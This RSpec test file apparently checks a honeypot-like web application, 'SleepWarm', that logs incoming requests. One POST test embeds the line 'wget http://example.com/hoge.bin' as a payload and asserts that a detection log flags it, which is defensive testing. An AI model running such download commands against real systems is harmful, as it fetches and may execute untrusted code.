require "stringio"
require "base64"

describe SleepWarm::Application do
  include_context "rackapp testing"

  context "GET with no header" do
    it "responds with a 200 OK" do
      get 'http://example.com/'
      expect(last_response.status).to eq(200)
      expect(last_response.body).not_to be_empty

      queue = io_to_queue(@spyup_log)
      log = queue.last
      expect(log["request_line"]).to include("GET http://example.com")
    end
  end

  context "GET with a header" do
    it "responds with a 200 OK" do
      header "User-Agent", "Firefox"
      get 'http://example.com'
      expect(last_response.status).to eq(200)
      expect(last_response.body).not_to be_empty

      queue = io_to_queue(@spyup_log)
      log = queue.last
      decoded_req = Base64.decode64(log["all"])
      expect(decoded_req).to include("GET http://example.com")
      expect(decoded_req).to include("User-Agent: Firefox")
    end
  end

  context "POST with no payload" do
    it "responds with a 200 OK" do
      post 'http://example.com'
      expect(last_response.status).to eq(200)
      expect(last_response.body).not_to be_empty

      queue = io_to_queue(@spyup_log)
      log = queue.last
      decoded_req = Base64.decode64(log["all"])
      expect(decoded_req).to include("POST http://example.com")
    end
  end

  context "POST with payload" do
    it "responds with a 200 OK" do
      input = <<EOF
--AaB03x\r
Content-Type: text/xml; charset=utf-8\r
Content-Id: <soap-start>\r
Content-Transfer-Encoding: 7bit\r
\r
foo\r
wget http://example.com/hoge.bin\r
--AaB03x--\r
EOF
      post 'http://example.com', input
      expect(last_response.status).to eq(200)
      expect(last_response.body).not_to be_empty

      queue = io_to_queue(@spyup_log)
      log = queue.last
      decoded_req = Base64.decode64(log["all"])
      expect(decoded_req).to include("POST http://example.com")
      expect(decoded_req).to include("Content-Length: #{input.length}")
      expect(decoded_req).to include("Content-Type: application/x-www-form-urlencoded")
      expect(decoded_req).to include("foo")

      queue = io_to_queue(@huntup_log)
      log = queue.last
      expect(log["hits"]).to include("wget http://example.com/hoge.bin")
    end
  end
end
